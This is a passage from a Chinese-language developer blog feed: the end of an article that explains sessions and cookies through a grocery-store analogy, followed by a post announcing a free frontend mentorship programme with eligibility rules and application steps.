是無狀態的，所以每一個 Request 都是不相關的，就像是對小明來說每一位客人都是新的客人一樣，他根本不知道誰是誰。既然你沒辦法把他們關連，就代表狀態這件事情也不存在。</p><p><img src="/img/session-and-cookie-15e47ed838bc/1__0yEme4DHELjmb4ItUEKxPw.png"></p><p>那怎麼辦呢？</p><p>在故事裡我們用紙條來解決這件事情，小明會在結帳時寫下紙條並遞給客人，客人下次只要再帶著紙條過來，小明就知道發生什麼事了。</p><p><img src="/img/session-and-cookie-15e47ed838bc/1__srX7XlKxNdgSsZPclbN4vg.png"></p><p>小明最大的問題就是他自己沒辦法記憶「狀態」，因此需要倚靠一個機制來幫他管理「狀態」，而這個機制我們就叫做 Session。</p><p>原本對小明來說，每一個客人都是新的客人，彼此之間毫無關聯，所以也沒有任何狀態可言。但有了紙條以後，兩個在小明眼中完全不同的客人被關聯了起來，小明就可以知道：「原來這個新的客人是以前那個來買木材的客人！」</p><p>所以 Session 是什麼？就是一種讓 Request 變成 stateful 的機制。以小明的例子來說，Session 就是一種讓客人之間能互相關聯起來的機制。</p><p>小明靠紙條來實作 Session 機制，那在網路世界中可以靠什麼呢？</p><p>舉一個最簡單的例子，網址！</p><p>讓我們假設有個購物網站的網址是：market.tw，當你把蘋果加入購物車的時候，你其實是送一個 Request 給伺服器，然後伺服器會把你導到 market.tw?item1&#x3D;apple，接著你再把火山矽肺病加入購物車，網址就會變成：market.tw?item1&#x3D;apple&amp;item2&#x3D;pneumonoultramicroscopicsilicovolcanoconiosis</p><p>最後你按下結帳，伺服器就靠著你網址列上的資訊來判斷你的狀態是什麼，在這個例子中就等同於看你的購物車裡面有什麼。</p><p><img src="/img/session-and-cookie-15e47ed838bc/1__1R5DnG0NkD7z__fVPVG3smg.png"></p><p>簡單來說呢，網址列上的資訊就是小明故事中的紙條，是儲存狀態的地方。而上述例子 Client 與 Server 透過網址列上的狀態來實作 Session 機制。</p><p>好，中場休息差不多到這邊要結束了。這一段是想先拉回網路的部分，從原本故事中的比喻切回真實世界網路的運作模式，以及先讓大家理解 Session 到底是個什麼東西。</p><p>在接下來的故事裡面，小明會碰到更多更多的問題，他能迎刃而解嗎？讓我們繼續看下去。</p><h3 id="到底誰會隨身攜帶紙條？"><a href="#到底誰會隨身攜帶紙條？" class="headerlink" title="到底誰會隨身攜帶紙條？"></a>到底誰會隨身攜帶紙條？</h3><p>前面已經有提過了，儘管小明靠著這個紙條的機制留住了一些常客，但是新客人呢？有多少人會願意為了再來這間店而特地留下具有狀態的紙條？</p><p>基本上沒有，因為這樣子太麻煩了！</p><p>有天小明在快要入眠時，忽有一龐然大物拔山倒樹而來，蓋一靈感也。他想到了一個絕妙的 idea：「不會有人隨身攜帶紙條，但總會隨身攜帶手機吧！」</p><p>於是流程就變成這樣子：</p><ol><li>客人來店裡消費，小明結帳時請他拿出手機，並在手機裡面留了一些資訊</li><li>客人第二次來店裡，小明看看手機裡有沒有之前自己留下的資訊</li></ol><p>先不用管到底小明把資訊放在手機的哪裡，這不是重點；重點是手機裡的資訊取代了以前的紙條，客人不用刻意再帶一個沒有用的紙條了，只需要把本來就會隨身攜帶的手機拿出來就好，跟以前相比方便許多。</p><p>好，接下來我們終於要講到標題的第二個東西了：Cookie。</p><p>Cookie 是什麼？Cookie 就是故事裡面存在手機的資訊。</p><p>想要知道真正使用 Cookie 的流程，你只要把上面的客人用「瀏覽器」來取代，小明用「伺服器」來取代，就是答案了：</p><ol><li>瀏覽器發送一個 Request 給 Server，Server 叫瀏覽器設置 Cookie，瀏覽器便把這些資料存在 Cookie 裡面。</li><li>瀏覽器帶著 Cookie 一起發 Request 給 Server，Server 根據 Cookie 的內容決定狀態</li></ol><p><img src="/img/session-and-cookie-15e47ed838bc/1__7C__no8pc__iW4qIo3cKNRMA.png"></p><p>雖然在現實生活中不是每個人都會隨身攜帶手機，但是每個瀏覽器都會把 Cookie 一併帶上去，也會按照 Server 的指令來儲存 Cookie。</p><p>你可以把 Cookie 稱作是一個機制，Server 可以利用 Set-Cookie 這個語法讓 瀏覽器儲存一些內容，而這些內容會在瀏覽器發送 Request 時一併送上來。</p><p>而瀏覽器裡儲存的那些內容也叫做 Cookie，就是我們故事中所提的小紙條或者是存在手機裡的資訊。</p><p>前面有提過 Session 機制可以只靠網址列實作，跟 Cookie 可以一點關係都沒有。但在實際應用上，Session 之所以常常跟 Cookie 綁在一起，就是因為靠 Cookie 來實作 Session 機制的話非常方便。</p><p>或者應該這樣說，Cookie 本來就是為了實作 Session 而生的。藉由標準化的規範，制定了一個專門用來讓瀏覽器與 Server 交換資料的機制，如果用故事來比喻，就好比政府制定說每個人隨身一定要攜帶手機，然後手機裡面一定要存小明留下來的狀態。</p><p>這邊再來做個簡單的總結。</p><p>Session 是什麼？就是一種讓 Request 變成 stateful 的機制。以小明的例子來說，Session 就是一種讓客人之間能互相關聯起來的機制。在故事裡面我們用了紙條跟手機裡的資訊來比喻，有多種方式可以達成 Session。</p><p>在網路世界中，也有很多種方式可以來實作 Session，前面介紹過第一種是網址列，第二種就是靠 Cookie。而 Cookie 就是存在瀏覽器裡的一些資訊。</p><p>講到這邊，差不多就把 Session 與 Cookie 的定義與介紹講完了，但故事還沒完呢，我們還有最後一個問題要來解決。</p><h3 id="咖啡寄杯的煩惱"><a href="#咖啡寄杯的煩惱" class="headerlink" title="咖啡寄杯的煩惱"></a>咖啡寄杯的煩惱</h3><p>雖然店裡生意還可以，但小明無時無刻不想著怎麼樣發大財賺大錢，讓店裡的生意變得更好。他觀察到最近好多便利商店開始賣起了咖啡，而且時不時就買一送一或是第二件半價，並且貼心地提供了寄杯的服務。</p><p>寄杯就是指說你今天先喝一杯，剩下那杯我幫你記著，你下次來的時候跟我講我再給你。如果不提供這種服務，那買一送一就一定要兩個人才能喝了（或是你立刻喝兩杯），根本就是排擠像小明這樣的邊緣人。秉持著將心比心的原則，小明當然是希望提供寄杯服務的。</p><p>那該怎麼寄呢？</p><p>照之前那樣不就得了嗎？原本客人的手機裡面會存著消費習慣之類的東西，現在多存一個還有幾杯咖啡不就行了？例如說客人買兩杯只喝一杯，就在上面寫著：coffee&#x3D;1，代表還剩一杯咖啡，下次來的時候只要出示這個資訊，就再給他一杯。</p><p>聽起來十分合理，而且小明也這樣做了，店裡的生意變得更好，買咖啡的人愈來愈多，靠著咖啡就讓單月營收翻了兩倍。</p><p>一切看似非常順利，直到小明月底對帳的時候。</p><blockquote><p>不對啊，為什麼買咖啡的數量只有 55 杯，賣出去的卻有 66 杯？</p></blockquote><p>一向很相信人的小明，在那一瞬間見識到了人心的險惡之處。沒錯，有人自己偷改資訊，例如說把 coffee&#x3D;1 加個幾劃改成 coffee&#x3D;7，就獲得了額外六杯的免費咖啡。</p><p>這些奧步讓小明狠狠一夜之間變成了大人，絕望的小明把悲憤轉化成力量，只花了三個晚上就想到了兩個解決方法。</p><p>第一個方法最簡單，就是只要把存在客人手機上的資訊加密就好了。例如說原本是 coffee&#x3D;1，經過小明自製的特殊加密演算法之後，會變成 ED85B89167A84B631C10B046B5FB7FC0 這串只有小明知道怎麼解開的密文。這樣一來，除非客人可以破解這段密碼，否則資訊就不可能被竄改。</p><p>但有一個小缺點，那就是當小明想存的資訊愈來愈多之後，這一串字也會愈來愈長，就會在客人的手機裡面佔更大的容量。這個容量是有上限的，客人不會把整台手機都給你存這些資訊，所以這點要特別注意。</p><p>這個方法解決問題的思路是這樣的：「既然存在手機上的資訊會被竄改，那我讓他不能改就好」。</p><p>而第二個方法解決問題的思路是這樣的：「既然存在手機上的資訊會被竄改，那我把資訊存在我這邊不就好了嗎？」</p><p>與其把那些消費習慣或是寄杯數量存在客人的手機裡，不如把這些東西記在我的筆記本裡面，並且用一種方式把這兩個資訊對應起來，這樣就不怕資料會被改動了。</p><p>舉例來說，小明可以在筆記本寫下客人的身分證字號跟相關資訊，例如說：「A111111111 coffee&#x3D;1」，接著小明只在客人的手機裡面存「A111111111」，下次客人再來消費的時候，就透過身分證字號去筆記本裡面查，就知道客人到底還剩幾杯咖啡了。</p><p>由於小明的筆記本每天下班都會鎖在保險箱裡面，因此不用害怕被偷或是被改，可以假設它一定是準確的。而這樣子的方式不把主要資訊存在客人那裡，而是存在自己這裡，所以也不會有被竄改的風險。</p><p>可是有個問題，如果有人把身分證字號改成其他人的怎麼辦？那不就破功了嗎？就可以偽造其他人的身份。</p><p>這個簡單，不如不要用身分證字號，用一個 16 位數的英數字混合亂碼好了，例如說：A59Uhe7I94J330mN，這樣就很難被猜到了吧！</p><p>於是流程會變成這樣：</p><p><img src="/img/session-and-cookie-15e47ed838bc/1____FDXY__p__4CFaDNKHu3PiOw.png"></p><p>跟之前一樣，他們都是透過一張紙條或者是手機裡的資訊來溝通，但唯一的差別是客人跟小明之間只透過 A59Uhe7I94J330mN 這個存在手機裡的 ID 來驗證身份，其他相關資訊都寫在小明的筆記本裡面。</p><p>這種驗證的方法就像是我曾經去過的網咖。因為會員打咖比較便宜嘛，一小 60 變成一小 36，不辦白不辦，就辦了一張會員卡。店員特別說明認卡不認人，一定要出示卡片才行。</p><p>我只要去打咖的時候出示這張會員卡，店員就知道我曾經消費過多少錢，也知道我喜歡點的餐點，所有的資訊都是存在他們的系統裡面，而我的身份就是透過這張會員卡來表示。</p><p>寄杯的例子中，會員卡就是 A59Uhe7I94J330mN 這個 ID，網咖的電腦系統就是小明的筆記本。</p><p>小明最後決定用第二種方法，也就是這種靠 ID 認人的方式來管理客人的狀態。從此之後就沒有客人能夠竄改資訊了，而寄杯服務也運行的十分順利，真是皆大歡喜，可喜可賀。</p><p>至於後來變得生意太好，讓小明開了分店以後碰到的那些問題，就又是另外一段故事了。</p><h3 id="儲存狀態的方式"><a href="#儲存狀態的方式" class="headerlink" title="儲存狀態的方式"></a>儲存狀態的方式</h3><p>小明的故事說完了，該來把上面這一段變成網路的實際案例了。</p><p>其實在網路世界中問題也是一樣的。前面已經提到過我們會把狀態存在 Cookie 裡面，讓 Request 之間能夠變得有關聯。假設我們今天要來做一個會員系統，那我要怎麼知道這個 Request 代表的是哪一個會員？</p><p>最直覺的方式就是登入以後把會員帳號存在 Cookie 裡面嘛，這樣不就知道是誰了嗎？可是會碰到的問題就跟寄杯的故事一樣，Cookie 裡的東西是可以被竄改的，如果我改成了別人的會員帳號，我就可以偽造他的身份登入了！</p><p>解決方法跟上面寄杯的解法一樣。</p><p>第一個解法就是把 Cookie 裡面的內容給加密，這樣就無法被竄改了。這種方式就稱之為 Cookie-based session，意思就是你把所有的 Session 狀態都存在 Cookie 裡面。</p><p>所以不要把「用 Cookie 來實作 Session 機制」跟「Cookie-based session」搞混了，兩者是不一樣的。</p><p>至於缺點的話前面有提到，Cookie 的大小是有限制的，超過大小的話瀏覽器就不幫你存了。因此當你想存的資訊越來越多，Cookie 當然也越來越大，就有可能超過這個限制。或者是哪天你的加密方式以及密鑰被駭客破解，那駭客一樣可以偽造任何人的身份。</p><p>第二個解法就是透過一個 ID 來辨識身份，這個 ID 稱之為 Session Identifier，簡稱 Session ID。Server 只在 Cookie 裡面存一個 Session ID，其餘的狀態都存在 Server 那邊，我習慣把 Server 那邊的資料稱為 Session Data：</p><p><img src="/img/session-and-cookie-15e47ed838bc/1__atP0XsPDnpmHIvxACcoOvA.png"></p><p>SessionID 的產生方式跟前面說的一樣，通常會是一個無法猜測的亂數。你可能會想說：「很難猜是一回事，但機率不是 0 阿！」，對，的確是有機率能夠猜到，但是那個機率太低太低了（例如說幾千億分之一之類的）。而且 Server 在你亂猜猜錯幾次之後就有可能把你 ban 掉不讓你繼續猜，所以沒什麼問題。</p><p>不過這邊要特別注意的一點是 SessionID 基本上是種認證不認人的方式，也就是說一旦你的 SessionID 被偷走，別人就可以偽造你的身份來登入了。而這個 SessionID 通常都是保存在 Cookie 之中。</p><p>這就是為什麼有些網站發生駭客入侵的情形之後你會突然被登出，因為駭客可能偷到一批 SessionID，這時候伺服器就會把所有 Session 資料全部清空，以故事來比喻就是把筆記本丟掉，買一本新的，這樣被偷走的那些 SessionID 就沒用了，而 Server 找不到你的 SessionID，自然就無法登入，因此把你給登出了。</p><p>網站發生問題時客服會要你先把 Cookie 清掉也是類似的道理，因為 Cookie 跟狀態有關，有時候可能程式有一些 bug，把你導到了錯誤的狀態，把 Cookie 清空等於把狀態清空，重新再開始，就有可能變得正常。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>其實我原本以為我很懂 Cookie 跟 Session，但越研究越發現好像不是這麼一回事，只是我自我感覺良好而已。但把該看的資料都看完一遍之後，再讓自己沈澱個幾天，大致上就能完全理解整個脈絡的發展。</p><p>Session 是什麼？就是一種讓 Request 變成 stateful 的機制。以小明的例子來說，Session 就是一種讓客人之間能互相關聯起來的機制。在故事裡面我們用了紙條跟手機裡的資訊來比喻，有多種方式可以達成 Session。</p><p>在網路世界中，也有很多種方式可以來實作 Session，前面介紹過第一種是網址列，第二種就是靠 Cookie，而 Cookie 就是存在瀏覽器裡的一些資訊。常見的錯誤認知是一定要有 Cookie 才能實作 Session，這是錯誤的。</p><p>有了 Session 之後，會碰到資料被竄改的問題，這時候有兩種解決方式，一個是 Cookie-based session，意思是你照舊把狀態存在 Cookie，但是加密以後再存；另一個方法是把狀態存在 Server 端，靠一個 SessionID 來辨識，這個狀態你可以存成檔案，可以存在記憶體裡，也可以存在資料庫，只是實作方式的不同而已，但原理都是一樣的。</p><p>而這個狀態儲存的地方在口語上也會被稱之為「Session」，例如說：「幫我把 user id 存在 session 裡」，或者是「登出記得把 session 清空」之類的，所以在實際用法中，我認為 session 之所以不好理解是因為太多地方用到同一個詞，但卻是在指涉不同的東西（可是又很類似）。跟 API 有點像，太多地方都用到這個詞了。</p><p>前面提過這是系列文的第一篇，這一篇預設沒有任何基礎的人都可以看，但下一篇就不是了，會預設讀者有一些背景知識。</p><p>三篇的完整連結如下：</p><p>1. <a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a><br>2. <a href="https://github.com/aszx87410/blog/issues/45">淺談 Session 與 Cookie：一起來讀 RFC</a><br>3. <a href="https://github.com/aszx87410/blog/issues/46">深入 Session 與 Cookie：Express、PHP 與 Rails 的實作</a></p><p>在寫這篇文章時有問過一些朋友的意見，特別感謝有與我討論的這些朋友們。</p><p>想持續關注的話可以 follow 一下。單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="https://www.facebook.com/lidemytw/">Lidemy 粉絲專頁</a>。之後的系列文會放在另一個部落格，比較硬的技術文都在那：<a href="https://github.com/aszx87410/blog">https://github.com/aszx87410/blog</a>。</p><p>想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium">https://aszx87410.github.io/blog/medium</a></p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>真正的 Mentorship program：前端引路人計畫</title>
      <link href="/2019/07/26/mentorship-program-350db93d5c9c/"/>
      <url>/2019/07/26/mentorship-program-350db93d5c9c/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mentorship-program-350db93d5c9c/0__Til3Rhb3__yv4g3PN.jpg"></p><p><strong>2019–08–16 補充：</strong></p><p><strong>報名已截止。</strong></p><p>2019–07–30 補充：</p><p>原本沒有報名期限，但因為報名的人很多，所以報名期限改為：2019–08–15，請在這個時間以前寄信過來。</p><h3 id="緣起"><a href="#緣起" class="headerlink" title="緣起"></a>緣起</h3><p>事情是這樣子的，兩年前我開始了一個《<a href="/2017/12/21/mentor-program-b5f96ae1eed1/">從零到一：程式導師實驗計畫</a>》，一開始其實是想做成 mentorship program 的形式，想說我一個人大概帶個四五個人，以指點大方向為主，讓 mentee 們在技術海裡面不會迷失。</p><p>但做著做著其實越來越偏離當初想要的形式，變成了像是 Bootcamp，把毫無基礎的人從零到一帶起來，而且教學也變得越來越詳細，跟 mentor 一點關係都沒有了。</p><p>但其實不是我偏離初衷，因為我原本想做的教學就有這兩種型態，問題在於我計畫的名字不該那樣取的…而且因為我那時候這樣子取，就導致我這篇文還要特別想一個另外的名稱。</p><p>這就是標題的由來跟這篇文的主旨：</p><blockquote><p>這次我要來做一個真的 mentorship program</p></blockquote><p>先說一下為什麼我想開這個計畫好了。</p><p>理由很簡單，跟我之前在<a href="/2019/02/06/why-blogging-ab77fd8c6ffa/">《每一篇心得都有價值 — — 為什麼初學者才更應該要寫心得筆記》</a>裡寫的一樣：</p><blockquote><p>幫助以前的自己。</p></blockquote><p>相信有很多人跟我一樣，在剛出社會或是工作的前一兩年可能都處於一個比較徬徨的狀態，不知道自己的 code 寫得好不好，也不知道自己之後該往哪裡去。碰到問題也沒什麼人可以討論，只能自己試著尋找解答；對於那些 Google 不到的問題，通常就代表著找不到解答了，因為你也不知道還可以去問誰。</p><p>這其實也不一定是件壞事，在這樣的環境下如果你撐過了，可以走出一條自己的路，可以不尋求外力的幫助而前進。但若是這時候有個 mentor 可以幫你點出方向或是給你一些協助，讓你能進步得更快，不也是件好事嗎？</p><p>如果我在出社會的第一年有個比較有工作經驗的前輩來當我 mentor，給我一些方向或是跟我討論一些問題，無論是生活上的、職涯上的或是技術上的都好，我相信那會是很不錯的一件事。</p><p>但沒有，我出社會的第一年沒有這種事情發生。</p><p>一直到現在也依舊沒有這種事情發生。我可以理解，因為本來就沒有人有義務當你的 mentor。</p><p>沒有人做怎麼辦？自己先跳下來做再說。</p><p>如果每個人都經歷了這個過程但沒有人試著去改善，就永遠都這樣子了。所以當我終於有能力幫助其他人的時候，我就會自己跳下來做。我想試著改變，或至少，試著去幫助以前的自己。</p><p>先來講講我心目中的 mentor 制到底在幹嘛。如果我是 mentee，我會希望當我有問題時 mentor 能夠給我一個方向，以及為什麼是這個方向的理由。決定還是在我，但至少 mentor 可以跟我分享他對這件事情的看法。</p><p>想知道 mentor 的看法是因為他走過的路比我多，我在思考某件事的時候可能只看到 A，但 mentor 身為一個資歷比較豐富的人，知道說除了 A 以外，後面其實還有 B、Ｃ、D 等等，這背後的東西都是那時候的我看不見或是很難看見的。</p><p>我會期望 mentor 對於技術上的問題可能可以給出一些方向或是指出某些盲點，對於職涯上的問題也能夠分享自身的一些經驗。不用手把手帶 mentee，只要指點方向就夠了。頻率不一定要很高，可能兩週一次或是一個月一次比較深度的討論，平時偶爾 sync 一下就好。</p><h3 id="前端引路人計畫內容"><a href="#前端引路人計畫內容" class="headerlink" title="前端引路人計畫內容"></a>前端引路人計畫內容</h3><p>前面講了我自己對 mentor 制的理解以及期望，接著來談談在這個「前端引路人計畫」裡面我能做到的事以及我可以提供協助的地方。</p><p>一般的技術問題跟職涯發展就不用特別提了，那個是一定會有的。但是這種一問一答的方式不夠有趣而且印象不夠深刻，我希望 mentee 能有一些產出，透過這些產出來精進自己的能力。</p><p>以下提供幾個我能幫到忙的方向：</p><h4 id="1-特定主題研究及技術文章撰寫"><a href="#1-特定主題研究及技術文章撰寫" class="headerlink" title="1. 特定主題研究及技術文章撰寫"></a>1. 特定主題研究及技術文章撰寫</h4><p>例如說你覺得自己對瀏覽器的同源政策不夠熟，那就花時間來研究一下這個主題，最後透過寫作來消化並確保自己是真的理解。</p><p>我能提供的協助就是幫你 review 文章，可以幫你看是不是寫的簡單易懂，也可以幫你看裡面有沒有技術上的錯誤。在前面研究的階段如果碰到什麼困難我也可以幫忙，如果我覺得不夠深的話也會鼓勵你研究得更深一點。</p><p>研究主題只要是前端的基本上都行，非前端的如果是我不熟悉的主題的話那我幫助就有限了。</p><p><img src="/img/mentorship-program-350db93d5c9c/1__EJP4OhUqvkIf__uKIxh2iKQ.png"></p><p>如果你沒看過我寫的文章，可以先看這兩篇：</p><ol><li><a href="/2018/05/04/introduction-mvc-spa-and-ssr-545c941669e9/">跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR</a></li><li><a href="/2018/06/10/frontend-engineer-guide-297821512f4e/">零基礎的小明要如何成為前端工程師？</a></li></ol><p>若是想看更硬的技術文章，可以參考這兩篇：</p><ol><li><a href="https://github.com/aszx87410/blog/issues/34">我知道你懂 hoisting，可是你了解到多深？</a></li><li><a href="https://github.com/aszx87410/blog/issues/35">所有的函式都是閉包：談 JS 中的作用域與 Closure</a></li></ol><h4 id="2-技術相關小遊戲製作"><a href="#2-技術相關小遊戲製作" class="headerlink" title="2. 技術相關小遊戲製作"></a>2. 技術相關小遊戲製作</h4><p>有些東西學起來可能有點無聊，但如果能適當地透過遊戲的方式去學習，會變得滿有趣的。</p><p>例如說學習 CSS Selector 的 <a href="https://flukeout.github.io/">CSS Dinner</a> 以及 Flexbox 的 <a href="https://flexboxfroggy.com/">Flexbox Froggy</a>，或者是六角學院出的 <a href="https://hexschool.github.io/flexbox-pirate/index.html#/">Flex Pirate</a>，都是我覺得很有趣而且可以幫助到學習的專案。</p><p>之前我做了一個 Lidemy HTTP Challenge，後來也輔導學生做了一個異世界?r3:0挑戰，都是想用遊戲或者至少是闖關的方式來讓大家理解某個主題。</p><p><img src="/img/mentorship-program-350db93d5c9c/1__DNmYlpF13fdHLOCN0eMnrA.png"></p><p>我覺得這些都滿有趣的，也很希望能夠有更多類似的遊戲讓大家邊玩邊學習，所以我們可以想一個主題，然後想想看該來做什麼樣的遊戲比較合適。我可以給你一些 idea 也可以幫你 code review，一起合作出一個遊戲。</p><h4 id="3-做-side-project-並且開源"><a href="#3-做-side-project-並且開源" class="headerlink" title="3. 做 side project 並且開源"></a>3. 做 side project 並且開源</h4><p>有滿多新手的困擾都是不知道該如何增進程式能力，而我覺得要解決這個問題，做一個 side project 會滿有幫助的。透過做一個專案你可以從零開始打造一個產品，並且不斷地增加新功能。</p><p>除此之外，如果把它開源你在寫 code 時就會更注重品質（怕爛 code 被看到），也會需要學習如何寫出簡單易懂的 README。</p><p>我們可以用 <a href="https://guides.github.com/introduction/flow/">GitHub flow</a> 來開發，你每一次改變都要發 PR 然後我會幫你做 code review，也可以給一些程式架構相關的建議。而這個 side project 最後也可以放到你的履歷上面當作品集。</p><p>以上三個是我比較直覺能想到的方向，第三個感覺最容易，只要有一個 idea 就可以開始做了，不過要做出一個完整的產品需要有後端開發的能力，如果你不會後端的話我會先輔導你學 Node.js + Express。</p><p>第一個技術文章也是我滿想輔導的一個方向，很想看到更多品質不錯的繁體中文技術文章。第二個技術小遊戲也很有趣，但比較難的應該是決定要做什麼主題。</p><p>以上這些只是我剛好能想到的方向，若是你有其他 idea 覺得我可以幫到忙的也歡迎提出來，我們都可以再討論。</p><h3 id="報名資格與條件"><a href="#報名資格與條件" class="headerlink" title="報名資格與條件"></a>報名資格與條件</h3><p>以前大多都是帶沒有基礎的外行人，這次想來帶的對象是<strong>工程師</strong>，所以想參加這個計畫的話，<strong>你一定要是個工程師</strong>。工作經歷不限，但你一定得要有身為工程師的工作經驗，所以如果你只是想要轉職但還沒成為工程師的話，這種一概不收。</p><p>然後我的背景基本上是前端，所以會希望能帶到前端工程師。這個計畫的目的是想讓已經具備一定基礎的前端工程師快速成長，所以會希望報名的人已經具備前端基礎，而不是透過這個計畫才開始學前端。</p><p>超出我能力範圍的也不會收。如果你想知道我能力大概在哪，可以參考<a href="/2019/04/13/4-years-review-7fb7edc52687/">我寫過的技術文章列表</a>。</p><p>預計收 5 個人左右，但依照情況調整。</p><p>有一點要特別注意的是<strong>你必須付出一定的時間在這個計畫上</strong>。目前預計每兩週會稍微聊一下近況跟在做的專案的進度，如果你是對技術文章撰寫比較有興趣，那我可能會要求一個月要有一篇文章，小遊戲的話大概兩三個月必須要有成品，所以每兩週也都要有進度；開源專案一開始會先討論一下架構等等的，然後一樣每兩週都要有進度。</p><p>但其實有些時候會因為卡關或是種種原因可能沒什麼進度，這種情況其實也 ok，畢竟我真正在意的是你有沒有付出時間在這上面，而不是強迫你一定要有進度。只要有付出時間並且有學到東西，卡關也是沒有問題的。</p><p>但只要我覺得你沒有付出一定心力在這計畫上，你就會被淘汰掉。對，這個計畫也有淘汰制，但是標準我沒辦法像之前其他計畫那樣很明確訂出來。不過也不用太擔心，當我覺得你沒達到那個標準的時候會先提醒你，並且給你一段時間改善，過一陣子還是沒達標才會淘汰。</p><p>例如說你寫一篇篇幅普通的技術文章寫了三個月還沒寫完，如果沒有特殊原因的話，這種就很高機率會被淘汰；或者是做一個簡單的會員功能，只要實作註冊、登入跟登出結果做了兩個月，也很可能會被淘汰（狀況還是因人而異，我這邊只是稍微舉個例子）。</p><p>不過不用太擔心啦，我沒有很嚴厲。我不是說一定要像準備大考那樣子戰戰兢兢，像是假日想放鬆或是出國旅遊放個假之類的我也都 ok，這些都可以彈性調整。</p><p>我只是想強調身為一個在職的人，假日或下班時間通常都會想休息。你要先下定決心，願意把這些時間撥出一些來讓自己成長，才適合報名這個計畫。</p><p>計畫時間基本上為一年，一年後根據成效以及當時的狀況再決定要不要繼續下去。</p><p>最後，強調一下最重要的兩點：</p><h4 id="完全免費"><a href="#完全免費" class="headerlink" title="完全免費"></a>完全免費</h4><p>這個計畫完全免費，沒有任何隱藏費用。但做 side project 需要用到的資源例如說網域或是主機那些你都要自己處理。</p><h4 id="薪火相傳"><a href="#薪火相傳" class="headerlink" title="薪火相傳"></a>薪火相傳</h4><p>如果這個計畫進行得順利，我希望能讓更多人參與這個計畫。但我永遠都只有一個人，那該怎麼辦呢？要來報名的 mentee 必須答應這個條件：</p><blockquote><p>一年之後你也要開啟相同的計畫，收的人數不能少於 2 個</p></blockquote><p>「相同的計畫」指的是你也不能收費，也要免費輔導一些工程師，最少兩個人。你可能會覺得說：「你夠格嗎？」，夠。如果擔心自己不夠格，可以輔導一些剛入行有潛力的工程師，你應該還是有很多地方可以給他們建議。</p><p>這就像寫技術文章一樣，你寫的淺白可以給外行人看，寫的深入可以給資深的看，無論深或淺都一定會有受眾。</p><p>如果這一年過後你很感謝我這樣免費帶人，不用感謝我，你帶著這份謝意也開一樣的計畫去幫助其他人，就是最好的回報了。</p><h3 id="報名方式"><a href="#報名方式" class="headerlink" title="報名方式"></a>報名方式</h3><p>先幫大家總結一下這計劃，首先這計畫完全免費，但你一年後也必須做同樣的事情去帶人。計畫內容基本上就是當你的 mentor 來輔導你，除了一般的技術問題及職涯相關問題諮詢以外，具體的方向大概是（1）研究特定主題及撰寫文章（2）製作技術小遊戲以及（3）製作開源 side project，透過這些專案來提升自己的技術能力。</p><p>（報名已截止）</p><p>標題請打：[報名] 前端引路人— huli<br>（請把 huli 換成你自己的暱稱）</p><p>內文麻煩附上：</p><ol><li>自我介紹（讓我更瞭解你）</li><li>目前的工作內容、狀況以及在工作上碰到的困難</li><li>報名這個計畫的理由</li><li>希望能從我這邊獲得的協助</li><li>若成功錄取之後，你的時間安排大概為何（例如說每個禮拜大概可以花 10 小時來弄這個計畫相關的專案等等）</li><li>平時有寫東西的習慣嗎？（像是部落格、讀書心得、電影心得或者是旅遊日記都可以，有的話可以多談談這部分或附上網址，沒有的話也沒關係）</li><li>任何你覺得可以幫自己加到分的東西（覺得沒有也可以不寫）</li><li>任何你想跟我分享的東西（例如說你寫的小說、你畫的圖、你的一篇廢文等等，跟程式一點關係都沒有也行）</li></ol><p>直接打在信件裡面或是寄 PDF 檔來都行，你要寫在 hackmd 或是 gist 上也可以，總之以可讀性為優先，千萬不要寄 doc 檔過來，我開不了。</p><p>如果你能按照<a href="https://github.com/sparanoid/chinese-copywriting-guidelines">中文文案排版指北</a>來排版我會十分感謝。錯字記得自己修一修，太多錯字的話我可能會被激怒（？）。</p><p>收到信件之後大概三四天內我會回覆一個罐頭回信，讓你知道我有收到了。若是你過一週都沒收到回信，麻煩請<a href="https://www.facebook.com/lidemytw/">私訊粉專</a>詢問。</p><p><strong>請記得，Google 表單填完跟寄信之後才算是報名成功，兩者缺一不可。</strong></p><p>由於這個計畫有名額限制，為了使效益最大化，我會找我覺得最有潛力的一些人。如果我眼光夠準，一年之後他們的前端引路人計畫就能夠幫助到更多人。</p><p>再來，因為我本身就滿愛寫東西的，所以在寫作這塊會特別看重。我不覺得工程師一定要會寫東西，這只是我個人偏好而已。但如果你本身就有在寫一些部落格的話那會大加分，例如說我曾經主動拉進我計畫的 <a href="https://pvt5r486.github.io/">pvt5r486</a> 跟 <a href="https://medium.com/@brianwu291">Brian</a>，都是因為曾經有寫過一些技術文章的緣故。</p><p>不用怕報名信的內容太長，我滿喜歡看長文的，而且有時候必須寫長一點才能把脈絡講得比較清楚。但也不用為了長而長，基本上能夠寫的清楚最重要，把想表達的都表達出來。</p><p>最後，這個計畫採取先到先審制。</p><p><strong>2019–08–16 補充：</strong></p><p><strong>報名已截止。</strong></p><p>2019–07–30 補充：</p><p>原本沒有報名期限，但因為報名的人很多，所以報名期限改為：2019–08–15，請在這個時間以前寄信過來。</p><p>因為從我之前收報名表的經驗看起來，很多時候一收到信就能決定要不要錄取了。我是覺得不用怕太晚寄而失去機會，因為以我的個性來說，如果你真的很突出，就算是超出名額我也會收你。</p><p>大概收到信後的兩個禮拜內我就會給你回覆，快的話可能隔天就跟你說錄取或是不錄取了。若是人數真的收太滿，我會更新在這篇文章以及 Google 表單，如果你沒看到相關字眼，就代表還在收人。</p><h3 id="結語"><a href="#結語" class="headerlink" 